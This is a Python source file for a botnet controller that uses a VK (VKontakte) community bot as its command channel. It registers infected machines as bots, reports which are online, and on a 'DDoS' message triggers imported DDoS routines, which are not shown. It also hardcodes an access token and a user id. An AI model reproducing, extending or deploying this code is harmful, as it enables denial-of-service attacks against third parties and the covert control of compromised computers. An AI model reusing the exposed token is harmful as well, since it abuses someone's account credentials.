from MainDDoS import mainDDoS
from SecondDDoS import secondDDoS
from vk_api import VkApi
from vk_api.utils import get_random_id
from vk_api.longpoll import VkLongPoll, VkEventType
from getpass import getuser

token = '4691d8f6706204dafcf4410fb911a1e515b2dcfde010bd34940b4e4388499a6f1f1ff452c28d91003cfce' # Community token

vk_session = VkApi(token=token) # "Run" your community
vk = vk_session.get_api() # Begin work with API
longpoll = VkLongPoll(vk_session) # Longpoll makes that community recive messagess

# Function that send messages
def message(message):
    vk.messages.send(
        peer_id = '300617283', # Your VK id
        message = message,
        random_id = get_random_id(),
    )



name = getuser() # Name = name of your PC

# Cycle that takes messages
for event in longpoll.listen():
    if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text: # if you send message
        if event.text == name + ' 16080305': # if message is your PC name + password
            # Shown all commands
            message('Вход выполнен - ' + name)
            message("Команды: ")
            message('DDoS - войти в DDoS панель')
            message('Check - проверить появились-ли новые боты')
            message('online - боты онлайн')
            for event in longpoll.listen(): # Wait for next command
                if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
                    if event.text == 'DDoS':
                        mainDDoS() # Run mainDDoS - with notification
                    elif event.text == 'online':
                        message(name + ' - Админ онлайн') # Show all bots online
        elif event.text == 'Check': # if you logined as admin you type Check and other BotNETs will logined as bots
            message('Бот в сети! - ' + name)
            for event in longpoll.listen(): # Wait for next command
                if event.type == VkEventType.MESSAGE_NEW and event.to_me and event.text:
                    if event.text == 'DDoS':
                        secondDDoS() # Run secondDDoS - without notification
                    elif event.text == 'online':
                        message(name + ' - онлайн') # Show all bots online


